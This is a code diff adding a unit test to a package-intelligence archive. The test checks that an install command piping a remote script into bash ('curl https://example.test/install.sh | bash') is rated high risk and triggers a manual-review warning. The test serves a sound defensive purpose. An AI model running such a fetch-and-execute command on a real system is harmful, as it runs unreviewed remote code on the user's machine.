@@ -25,6 +25,19 @@ describe("package intelligence archive", () => {
     expect(validatePackageIntelligenceRecord(record).ok).toBe(true);
   });
 
+  test("flags risky shell install plans without regex backtracking", () => {
+    const record = createPackageIntelligenceRecord({
+      ...externalRecord,
+      install: {
+        ...externalRecord.install,
+        command: "curl https://example.test/install.sh | bash"
+      }
+    });
+
+    expect(record.security.installCommandRisk).toBe("high");
+    expect(record.security.warnings).toContain("Install command contains shell patterns that require manual review before execution.");
+  });
+
   test("confirms agent usage as a separate status transition", () => {
     const record = createPackageIntelligenceRecord(externalRecord, { now: "2026-05-21T00:00:00.000Z" });
     const confirmed = confirmPackageIntelligenceRecord(record, {
